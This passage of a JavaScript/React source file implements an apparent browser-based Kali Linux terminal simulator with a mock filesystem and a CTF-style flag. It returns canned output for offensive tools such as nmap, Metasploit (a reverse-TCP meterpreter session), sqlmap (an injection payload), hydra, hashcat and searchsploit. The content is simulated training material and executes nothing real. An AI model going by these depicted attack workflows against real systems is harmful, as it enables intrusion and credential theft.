          user: "kali",
          cwd: "~",
          timestamp: new Date().toLocaleTimeString(),
          content: generateNeofetch("kali", "kali")
        }
      ],
      cmdHistory: ["neofetch"],
      historyIdx: -1,
      fs: JSON.parse(JSON.stringify(DEFAULT_FS))
    };
    setTabs(prev => [...prev, newTab]);
    setActiveTabId(newId);
  };

  // Close tab
  const closeTab = (tabId, e) => {
    e?.stopPropagation();
    if (tabs.length === 1) {
      updateActiveTab({ history: [] });
      return;
    }
    const remaining = tabs.filter(t => t.id !== tabId);
    setTabs(remaining);
    if (activeTabId === tabId) {
      setActiveTabId(remaining[0].id);
    }
  };

  // Autocomplete command
  const handleAutocomplete = () => {
    if (activeTab.ghostText) {
      const full = activeTab.input + activeTab.ghostText;
      updateActiveTab({ input: full + " ", ghostText: "" });
      return;
    }

    const currentInput = activeTab.input;
    if (!currentInput) return;

    const match = KNOWN_COMMANDS.find(c => c.startsWith(currentInput.toLowerCase().trim()));
    if (match) {
      updateActiveTab({ input: match + " ", ghostText: "" });
    } else {
      if (soundEnabled) playBellSound();
    }
  };

  // ─── COMMAND EXECUTION ENGINE ────────────────────────────────
  const executeCommand = async (rawCmd) => {
    const cmd = rawCmd.trim();
    if (!cmd) return;

    // Add to history
    updateActiveTab(prev => ({
      cmdHistory: [cmd, ...prev.cmdHistory.filter(c => c !== cmd)].slice(0, 100),
      historyIdx: -1,
      input: "",
      ghostText: ""
    }));

    // ─── PIPES AND REDIRECTION ENGINE (e.g. echo "text" >> file, cat notes.txt | grep Open)
    if (cmd.includes(">>") || cmd.includes(">")) {
      const isAppend = cmd.includes(">>");
      const [sourceCmd, targetFileName] = cmd.split(isAppend ? ">>" : ">").map(s => s.trim());
      const currentDirKey = activeTab.cwd === "~" ? "/home/kali" : activeTab.cwd;

      let contentToWrite = "";
      if (sourceCmd.startsWith("echo ")) {
        contentToWrite = sourceCmd.slice(5).replace(/^["']|["']$/g, "");
      } else if (sourceCmd.startsWith("cat ")) {
        const fname = sourceCmd.slice(4).trim();
        const f = (activeTab.fs[currentDirKey] || []).find(x => x.name === fname);
        contentToWrite = f?.content || "";
      }

      setTabs(prevTabs =>
        prevTabs.map(tab => {
          if (tab.id !== activeTabId) return tab;
          const fsCopy = { ...tab.fs };
          const dirFiles = [...(fsCopy[currentDirKey] || [])];
          const existingIdx = dirFiles.findIndex(f => f.name === targetFileName);

          if (existingIdx >= 0) {
            const old = dirFiles[existingIdx];
            dirFiles[existingIdx] = {
              ...old,
              content: isAppend ? `${old.content || ""}\n${contentToWrite}` : contentToWrite,
              size: `${contentToWrite.length}B`
            };
          } else {
            dirFiles.push({
              name: targetFileName,
              type: "file",
              perms: "-rw-r--r--",
              owner: tab.user,
              group: tab.user,
              size: `${contentToWrite.length}B`,
              date: "Sep 03 23:30",
              content: contentToWrite
            });
          }
          fsCopy[currentDirKey] = dirFiles;
          return {
            ...tab,
            fs: fsCopy,
            history: [...tab.history, { command: cmd, user: tab.user, cwd: tab.cwd, content: { text: "" } }]
          };
        })
      );
      return;
    }

    // Pipe | grep
    if (cmd.includes("|") && cmd.includes("grep")) {
      const [leftCmd, rightCmd] = cmd.split("|").map(s => s.trim());
      const grepTarget = rightCmd.replace("grep", "").replace(/^["']|["']$/g, "").trim();
      const currentDirKey = activeTab.cwd === "~" ? "/home/kali" : activeTab.cwd;

      let sourceOutput = "";
      if (leftCmd.startsWith("cat ")) {
        const fname = leftCmd.slice(4).trim();
        const f = (activeTab.fs[currentDirKey] || []).find(x => x.name === fname);
        sourceOutput = f?.content || "";
      } else if (leftCmd.startsWith("ps") || leftCmd.startsWith("ss")) {
        sourceOutput = `tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=890,fd=3))\ntcp LISTEN 0 511 0.0.0.0:80 0.0.0.0:* users:(("apache2",pid=2410,fd=4))\ntcp LISTEN 0 70 0.0.0.0:3306 0.0.0.0:* users:(("mysqld",pid=2840,fd=21))`;
      }

      const filtered = sourceOutput
        .split("\n")
        .filter(line => line.toLowerCase().includes(grepTarget.toLowerCase()))
        .join("\n");

      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: filtered || `(No matches for "${grepTarget}")` } }]
      }));
      return;
    }

    const tokens = cmd.split(/\s+/);
    const primary = tokens[0].toLowerCase();
    const args = tokens.slice(1);

    // ─── INTERACTIVE APPS: CMATRIX, HTOP, NANO ────────────────
    if (primary === "cmatrix") {
      setActiveApp({ type: "cmatrix" });
      return;
    }

    if (primary === "htop" || primary === "top") {
      setActiveApp({ type: "htop" });
      return;
    }

    if (primary === "nano") {
      const fname = args[0] || "untitled.txt";
      const currentDirKey = activeTab.cwd === "~" ? "/home/kali" : activeTab.cwd;
      const existingFile = (activeTab.fs[currentDirKey] || []).find(f => f.name === fname);
      setActiveApp({
        type: "nano",
        file: fname,
        content: existingFile?.content || ""
      });
      return;
    }

    // ─── METASPLOIT CONSOLE SUB-SHELL ─────────────────────────
    if (activeTab.msfMode) {
      if (primary === "exit" || primary === "quit") {
        updateActiveTab(prev => ({
          msfMode: false,
          title: `${tabs.findIndex(t => t.id === prev.id) + 1}. ${prev.user}@${prev.hostname}: ${prev.cwd}`,
          history: [...prev.history, {
            command: cmd,
            prompt: prev.msfPrompt,
            user: prev.user,
            cwd: prev.cwd,
            content: { text: "[*] Exiting Metasploit Framework..." }
          }]
        }));
        return;
      }

      if (primary === "help" || primary === "?") {
        updateActiveTab(prev => ({
          history: [...prev.history, {
            command: cmd,
            prompt: prev.msfPrompt,
            user: prev.user,
            cwd: prev.cwd,
            content: {
              text: `Core Commands
=============
    Command       Description
    -------       -----------
    ? / help      Help menu
    banner        Display an awesome metasploit banner
    use <module>  Interact with a module by name (e.g. use exploit/multi/handler)
    show options  Displays global options or for one or more modules
    set <var>     Sets a context-specific variable to a value (e.g. set LHOST 10.10.14.23)
    exploit / run Launch an active exploit or auxiliary module
    exit          Exit the console`
            }
          }]
        }));
        return;
      }

      if (primary === "banner") {
        updateActiveTab(prev => ({
          history: [...prev.history, {
            command: cmd,
            prompt: prev.msfPrompt,
            user: prev.user,
            cwd: prev.cwd,
            content: {
              text: `
  =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2412 exploits - 1245 auxiliary - 428 post       ]
+ -- --=[ 965 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]
`
            }
          }]
        }));
        return;
      }

      if (primary === "use") {
        const mod = args[0] || "exploit/multi/handler";
        const cleanMod = mod.split("/").pop();
        updateActiveTab(prev => ({
          msfPrompt: `msf6 exploit(${cleanMod}) > `,
          history: [...prev.history, {
            command: cmd,
            prompt: prev.msfPrompt,
            user: prev.user,
            cwd: prev.cwd,
            content: {
              text: `[*] Using configured payload generic/shell_reverse_tcp\nmsf6 exploit(${cleanMod}) > `
            }
          }]
        }));
        return;
      }

      if (primary === "show" && args[0] === "options") {
        updateActiveTab(prev => ({
          history: [...prev.history, {
            command: cmd,
            prompt: prev.msfPrompt,
            user: prev.user,
            cwd: prev.cwd,
            content: {
              text: `Module options (exploit/multi/handler):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   LHOST    10.10.14.23      yes       The listen address (tun0)
   LPORT    4444             yes       The listen port

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.23      yes       The listen address
   LPORT  4444             yes       The listen port`
            }
          }]
        }));
        return;
      }

      if (primary === "exploit" || primary === "run") {
        setLoading(true);
        setTimeout(() => {
          setLoading(false);
          updateActiveTab(prev => ({
            history: [...prev.history, {
              command: cmd,
              prompt: prev.msfPrompt,
              user: prev.user,
              cwd: prev.cwd,
              content: {
                text: `[*] Started reverse TCP handler on 10.10.14.23:4444
[*] Sending stage (3045380 bytes) to 10.10.11.23
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.11.23:49152) at ${new Date().toLocaleTimeString()}
[+] Success: meterpreter session active! (Type exit to close)`
              }
            }]
          }));
        }, 800);
        return;
      }

      updateActiveTab(prev => ({
        history: [...prev.history, {
          command: cmd,
          prompt: prev.msfPrompt,
          user: prev.user,
          cwd: prev.cwd,
          content: { text: `[*] Unknown command: ${cmd}. Type "help" for a list of valid commands.` }
        }]
      }));
      return;
    }

    // ─── SEARCHSPLOIT ──────────────────────────────────────────
    if (primary === "searchsploit") {
      const term = args.join(" ").toLowerCase();
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        let results = `--------------------------------------------------------------------------------------------------------
 Exploit Title                                                          |  Path
--------------------------------------------------------------------------------------------------------`;
        if (term.includes("vsftpd") || term.includes("ftp")) {
          results += `
vsftpd 2.3.4 - Backdoor Command Execution                              | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                | multiple/dos/49719.py`;
        } else if (term.includes("apache")) {
          results += `
Apache 2.4.49/2.4.50 - Path Traversal & Remote Code Execution (RCE)     | multiple/remote/50383.sh
Apache HTTP Server 2.4.52 - Mod_Proxy Buffer Overflow (CVE-2021-44790) | linux/remote/51201.py`;
        } else if (term.includes("linux") || term.includes("priv")) {
          results += `
Linux Kernel < 5.8 - 'Dirty Cred' Privilege Escalation (CVE-2022-2588) | linux/local/50995.c
Linux Polkit pkexec < 0.105 - PwnKit Local Privilege Escalation        | linux/local/50689.c`;
        } else {
          results += `
OpenSSH 8.9p1 - RegreSSHion Remote Code Execution (CVE-2024-6387)      | linux/remote/52014.py
Sudo 1.8.2 - 1.8.31p2 - 'Baron Samedit' Heap-Based Buffer Overflow     | linux/local/49521.py
WordPress Core < 5.8.2 - Stored Cross-Site Scripting (XSS)             | php/webapps/50532.txt`;
        }
        results += `
--------------------------------------------------------------------------------------------------------
Shellcodes: No Results
Papers: No Results`;
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: results } }]
        }));
      }, 500);
      return;
    }

    // ─── BASE64 ───────────────────────────────────────────────
    if (primary === "base64") {
      const isDecode = args[0] === "-d" || args[0] === "--decode";
      const val = isDecode ? args.slice(1).join(" ") : args.join(" ");
      try {
        const res = isDecode ? atob(val) : btoa(val);
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: res } }]
        }));
      } catch (err) {
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: "base64: invalid input" } }]
        }));
      }
      return;
    }

    // ─── MAN PAGES ────────────────────────────────────────────
    if (primary === "man") {
      const tool = args[0] || "nmap";
      const manPages = {
        nmap: `NMAP(1)                   User Commands                  NMAP(1)

NAME
       nmap - Network exploration tool and security / port scanner

SYNOPSIS
       nmap [Scan Type...] [Options] {target specification}

DESCRIPTION
       Nmap ("Network Mapper") is an open source tool for network
       exploration and security auditing. It was designed to rapidly
       scan large networks, although it works fine against single hosts.

OPTIONS
       -sS (TCP SYN scan)
       -sV (Version detection)
       -sC (Default NSE scripts)
       -p <port ranges> (Only scan specified ports)
       -A (Aggressive scan: OS detection, version scanning, traceroute)`,
        gobuster: `GOBUSTER(1)               User Commands              GOBUSTER(1)

NAME
       gobuster - Directory/file & DNS busting tool written in Go

SYNOPSIS
       gobuster dir -u <url> -w <wordlist> [options]

DESCRIPTION
       Gobuster is a tool used to brute-force URIs (directories and
       files) in web sites and DNS subdomains.`,
        msfconsole: `MSFCONSOLE(1)            User Commands             MSFCONSOLE(1)

NAME
       msfconsole - The Metasploit Framework Console Interface

DESCRIPTION
       msfconsole is the primary user interface to the Metasploit
       Framework. It provides an interactive all-in-one console interface
       to all options and features available in the Metasploit Framework.`
      };
      const text = manPages[tool] || `No manual entry for ${tool}`;
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text } }]
      }));
      return;
    }

    // ─── BUILT-IN KALI SHELL COMMANDS ─────────────────────────

    // Clear
    if (primary === "clear" || primary === "cls") {
      updateActiveTab({ history: [] });
      return;
    }

    // Neofetch
    if (primary === "neofetch" || primary === "fastfetch" || primary === "banner") {
      updateActiveTab(prev => ({
        history: [...prev.history, {
          command: cmd,
          user: prev.user,
          cwd: prev.cwd,
          content: generateNeofetch(prev.user, prev.hostname)
        }]
      }));
      return;
    }

    // Whoami
    if (primary === "whoami") {
      updateActiveTab(prev => ({
        history: [...prev.history, {
          command: cmd,
          user: prev.user,
          cwd: prev.cwd,
          content: { text: prev.user }
        }]
      }));
      return;
    }

    // ID
    if (primary === "id") {
      const isRoot = activeTab.user === "root";
      const out = isRoot
        ? "uid=0(root) gid=0(root) groups=0(root)"
        : "uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(kvm)";
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out } }]
      }));
      return;
    }

    // Uname
    if (primary === "uname") {
      const out = args.includes("-a") || args.length === 0
        ? "Linux kali 6.8.11-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali1 (2024-06-05) x86_64 GNU/Linux"
        : "Linux";
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out } }]
      }));
      return;
    }

    // Hostname
    if (primary === "hostname") {
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: prev.hostname } }]
      }));
      return;
    }

    // Date & Uptime
    if (primary === "date") {
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: new Date().toString() } }]
      }));
      return;
    }

    if (primary === "uptime") {
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: " 23:28:10 up  4:35,  2 users,  load average: 0.24, 0.18, 0.15" } }]
      }));
      return;
    }

    // History command
    if (primary === "history") {
      const out = activeTab.cmdHistory
        .slice()
        .reverse()
        .map((c, i) => `  ${String(i + 1).padStart(4, " ")}  ${c}`)
        .join("\n");
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out || "No history yet." } }]
      }));
      return;
    }

    // Privilege Escalation: sudo su / su
    if (cmd === "sudo su" || cmd === "sudo -i" || cmd === "su" || cmd === "su -" || cmd === "su root") {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        updateActiveTab(prev => ({
          user: "root",
          cwd: "/root",
          title: `${tabs.findIndex(t => t.id === prev.id) + 1}. root@${prev.hostname}: /root #`,
          history: [...prev.history, {
            command: cmd,
            user: prev.user,
            cwd: prev.cwd,
            content: { text: "[sudo] password for kali: [accepted]\nroot@kali:~# (Privileges elevated to root)" }
          }]
        }));
      }, 350);
      return;
    }

    if (primary === "exit") {
      if (activeTab.user === "root") {
        updateActiveTab(prev => ({
          user: "kali",
          cwd: "~",
          title: `${tabs.findIndex(t => t.id === prev.id) + 1}. kali@${prev.hostname}: ~`,
          history: [...prev.history, {
            command: cmd,
            user: prev.user,
            cwd: prev.cwd,
            content: { text: "logout\nkali@kali:~$ (Returned to non-privileged user session)" }
          }]
        }));
        return;
      } else {
        updateActiveTab(prev => ({
          history: [...prev.history, {
            command: cmd,
            user: prev.user,
            cwd: prev.cwd,
            content: { text: "[Process completed - session terminated. Click Clear to reset.]" }
          }]
        }));
        return;
      }
    }

    // Ifconfig / ip addr / ip a
    if (primary === "ifconfig" || (primary === "ip" && (args[0] === "a" || args[0] === "addr"))) {
      const out = `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.137  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::a00:27ff:fe4e:6608  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:4e:66:08  txqueuelen 1000  (Ethernet)
        RX packets 158204  bytes 151240182 (144.2 MiB)
        TX packets 98401  bytes 9410290 (8.9 MiB)

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2410  bytes 194100 (189.5 KiB)
        TX packets 2410  bytes 194100 (189.5 KiB)

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.23  netmask 255.255.254.0  destination 10.10.14.23
        inet6 fe80::5910:e7ff:feb1:5211  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 12040  bytes 9940120 (9.4 MiB)
        TX packets 14010  bytes 3140220 (2.9 MiB)`;
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out } }]
      }));
      return;
    }

    // Ping
    if (primary === "ping") {
      const target = args[0] || "127.0.0.1";
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        const out = `PING ${target} (${target}) 56(84) bytes of data.
64 bytes from ${target}: icmp_seq=1 ttl=64 time=0.038 ms
64 bytes from ${target}: icmp_seq=2 ttl=64 time=0.045 ms
64 bytes from ${target}: icmp_seq=3 ttl=64 time=0.041 ms
64 bytes from ${target}: icmp_seq=4 ttl=64 time=0.040 ms

--- ${target} ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3072ms
rtt min/avg/max/mdev = 0.038/0.041/0.045/0.002 ms`;
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out } }]
        }));
      }, 500);
      return;
    }

    // Filesystem: pwd
    if (primary === "pwd") {
      const realPath = activeTab.cwd === "~" ? "/home/kali" : activeTab.cwd;
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: realPath } }]
      }));
      return;
    }

    // Filesystem: ls / dir
    if (primary === "ls" || primary === "dir" || primary === "ll" || primary === "la") {
      const currentDirKey = activeTab.cwd === "~" ? "/home/kali" : activeTab.cwd;
      const files = activeTab.fs[currentDirKey] || [];
      const showAll = args.some(a => a.includes("a") || a.includes("l") || primary === "ll" || primary === "la");

      updateActiveTab(prev => ({
        history: [...prev.history, {
          command: cmd,
          user: prev.user,
          cwd: prev.cwd,
          content: { isLs: true, files, showAll, currentDir: currentDirKey }
        }]
      }));
      return;
    }

    // Filesystem: cd
    if (primary === "cd") {
      const targetDir = args[0] || "~";
      let nextCwd = activeTab.cwd;

      if (targetDir === "~" || targetDir === "/home/kali") {
        nextCwd = "~";
      } else if (targetDir === "/" || targetDir === "/etc" || targetDir === "/var/log" || targetDir === "/root") {
        if (targetDir === "/root" && activeTab.user !== "root") {
          updateActiveTab(prev => ({
            history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: "bash: cd: /root: Permission denied" } }]
          }));
          return;
        }
        nextCwd = targetDir;
      } else if (targetDir === "..") {
        if (activeTab.cwd.startsWith("/home/kali/")) {
          nextCwd = "~";
        } else if (activeTab.cwd === "~") {
          nextCwd = "/home";
        } else {
          nextCwd = "/";
        }
      } else {
        const resolved = activeTab.cwd === "~" ? `/home/kali/${targetDir}` : `${activeTab.cwd}/${targetDir}`;
        if (activeTab.fs[resolved]) {
          nextCwd = resolved;
        } else {
          updateActiveTab(prev => ({
            history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: `bash: cd: ${targetDir}: No such file or directory` } }]
          }));
          return;
        }
      }

      updateActiveTab(prev => ({
        cwd: nextCwd,
        title: `${tabs.findIndex(t => t.id === prev.id) + 1}. ${prev.user}@${prev.hostname}: ${nextCwd}`,
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: "" } }]
      }));
      return;
    }

    // Filesystem: cat
    if (primary === "cat") {
      const targetFile = args[0];
      if (!targetFile) {
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: "cat: missing file operand" } }]
        }));
        return;
      }

      const currentDirKey = activeTab.cwd === "~" ? "/home/kali" : activeTab.cwd;
      let matchedFile = null;

      if (targetFile.startsWith("/")) {
        const parts = targetFile.split("/");
        const fname = parts.pop();
        const pdir = parts.join("/") || "/";
        matchedFile = (activeTab.fs[pdir] || []).find(f => f.name === fname);
      } else {
        matchedFile = (activeTab.fs[currentDirKey] || []).find(f => f.name === targetFile);
      }

      if (matchedFile) {
        if (matchedFile.name === "flag.txt" && activeTab.user !== "root") {
          updateActiveTab(prev => ({
            history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: "cat: flag.txt: Permission denied (Requires root privilege)" } }]
          }));
          return;
        }
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: matchedFile.content || "(Empty file)" } }]
        }));
      } else {
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: `cat: ${targetFile}: No such file or directory` } }]
        }));
      }
      return;
    }

    // Touch & Mkdir & Rm
    if (primary === "touch" || primary === "mkdir" || primary === "rm") {
      const target = args[0];
      if (!target) {
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: `${primary}: missing operand` } }]
        }));
        return;
      }

      const currentDirKey = activeTab.cwd === "~" ? "/home/kali" : activeTab.cwd;
      setTabs(prevTabs =>
        prevTabs.map(tab => {
          if (tab.id !== activeTabId) return tab;
          const fsCopy = { ...tab.fs };
          let list = [...(fsCopy[currentDirKey] || [])];

          if (primary === "touch") {
            if (!list.some(f => f.name === target)) {
              list.push({
                name: target,
                type: "file",
                perms: "-rw-r--r--",
                owner: tab.user,
                group: tab.user,
                size: "0B",
                date: "Sep 03 23:35",
                content: ""
              });
            }
          } else if (primary === "mkdir") {
            const newPath = `${currentDirKey}/${target}`;
            fsCopy[newPath] = [];
            list.push({
              name: target,
              type: "dir",
              perms: "drwxr-xr-x",
              owner: tab.user,
              group: tab.user,
              size: "4.0K",
              date: "Sep 03 23:35"
            });
          } else if (primary === "rm") {
            list = list.filter(f => f.name !== target);
          }

          fsCopy[currentDirKey] = list;
          return {
            ...tab,
            fs: fsCopy,
            history: [...tab.history, { command: cmd, user: tab.user, cwd: tab.cwd, content: { text: "" } }]
          };
        })
      );
      return;
    }

    // ─── PENETRATION TESTING ARSENAL ─────────────────────────

    // NMAP
    if (primary === "nmap") {
      const target = args.find(a => !a.startsWith("-")) || "10.10.11.23";
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        const report = `Starting Nmap 7.94SVN ( https://nmap.org ) at ${new Date().toLocaleDateString()} ${new Date().toLocaleTimeString()} EDT
Nmap scan report for target (${target})
Host is up (0.024s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3 (Anonymous FTP login allowed)
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu) OpenSSL/3.0.2)
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: KRYNTRA Autonomous Cyber Defense Gateway
443/tcp  open  ssl/https   nginx 1.18.0
|_ssl-cert: Subject: commonName=gateway.kryntra.local
3306/tcp open  mysql       MySQL 8.0.35-0ubuntu0.22.04.1
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.84 seconds`;
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: report } }]
        }));
      }, 700);
      return;
    }

    // MSFCONSOLE
    if (primary === "msfconsole" || primary === "msf") {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        updateActiveTab(prev => ({
          msfMode: true,
          msfPrompt: "msf6 > ",
          title: `${tabs.findIndex(t => t.id === prev.id) + 1}. [msfconsole] ${prev.user}@${prev.hostname}`,
          history: [...prev.history, {
            command: cmd,
            user: prev.user,
            cwd: prev.cwd,
            content: {
              text: `
  =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2412 exploits - 1245 auxiliary - 428 post       ]
+ -- --=[ 965 payloads - 46 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the 'search' command to find modules by name or CVE
Type "help" for a list of commands or "exit" to quit console.
`
            }
          }]
        }));
      }, 500);
      return;
    }

    // GOBUSTER / DIRB
    if (primary === "gobuster" || primary === "dirb") {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        const out = `===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.23
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 178] [--> http://10.10.11.23/admin/]
/api                  (Status: 200) [Size: 42]
/config               (Status: 403) [Size: 278]
/dashboard            (Status: 302) [Size: 0] [--> /login]
/login                (Status: 200) [Size: 2450]
/robots.txt           (Status: 200) [Size: 154]
/uploads              (Status: 301) [Size: 180] [--> http://10.10.11.23/uploads/]
===============================================================
Finished (7 findings) in 1.45s
===============================================================`;
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out } }]
        }));
      }, 800);
      return;
    }

    // SQLMAP
    if (primary === "sqlmap") {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        const out = `    ___
   __H__
 ___ ___[']_____ ___ ___  {1.8.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|           |_|   https://sqlmap.org

[*] starting @ ${new Date().toLocaleTimeString()}

[12:04:18] [INFO] testing connection to the target URL
[12:04:19] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:04:19] [INFO] testing if the parameter 'id' is dynamic
[12:04:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:04:21] [INFO] GET parameter 'id' is vulnerable.
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8812=8812
    Type: error-based
    Title: MySQL >= 5.0 AND error-based
---
[12:04:22] [INFO] the back-end DBMS is MySQL
available databases [3]:
[*] information_schema
[*] kryntra_core
[*] mysql`;
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out } }]
        }));
      }, 800);
      return;
    }

    // HYDRA
    if (primary === "hydra") {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        const out = `Hydra v9.5 (c) 2023 by van Hauser / THC & David Maciejak
[DATA] attacking ssh://10.10.11.23:22/
[22][ssh] host: 10.10.11.23   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found`;
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out } }]
        }));
      }, 700);
      return;
    }

    // HASHCAT
    if (primary === "hashcat") {
      const out = `hashcat (v6.2.6) starting...
* Device #1: NVIDIA GeForce RTX 4090 (24GB VRAM)
Hash-Target: e10adc3949ba59abbe56e057f20f883e (MD5)
Wordlist:    /home/kali/wordlists/rockyou.txt

e10adc3949ba59abbe56e057f20f883e:123456

Session..........: hashcat
Status...........: Cracked
Speed.#1.........:  9842.1 MH/s (util: 98%)
Recovered........: 1/1 (100.00%) Digests`;
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out } }]
      }));
      return;
    }

    // NIKTO
    if (primary === "nikto") {
      setLoading(true);
      setTimeout(() => {
        setLoading(false);
        const out = `- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.23
+ Target Hostname:    gateway.kryntra.local
+ Target Port:        80
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ /robots.txt: Entry '/admin/' is retrieved from robots.txt.
+ /config/: Directory indexing found.
+ 7812 requests: 0 error(s) and 4 item(s) reported on remote host`;
        updateActiveTab(prev => ({
          history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out } }]
        }));
      }, 700);
      return;
    }

    // KALI-TOOLS / HELP
    if (primary === "help" || primary === "kali-tools" || primary === "tools") {
      const out = `KALI LINUX CYBERSECURITY WORKSTATION (KRYNTRA ADVANCED TERMINAL)

Available Security & System Arsenal:
  01 - Information Gathering : nmap, searchsploit, ifconfig, ip a, ping
  02 - Vulnerability Analysis : nikto, sqlmap
  03 - Web Application      : gobuster, dirb, curl
  04 - Password Attacks     : hydra, hashcat, base64
  05 - Exploitation Tools   : msfconsole (Metasploit Framework)
  06 - Interactive Programs : nano (editor), cmatrix (rain), htop (monitor)
  07 - File Navigation      : ls, cd, pwd, cat, touch, mkdir, rm, grep, pipes (|), redirects (>, >>)
  08 - Privilege Escalation : sudo su, su -, exit

Keyboard Shortcuts:
  Tab            ZSH command / ghost auto-completion
  Right Arrow    Accept ghost text suggestion
  Ctrl + L       Clear screen
  Ctrl + C       Cancel current command or exit interactive program
  Alt + 1..9     Switch terminal tabs
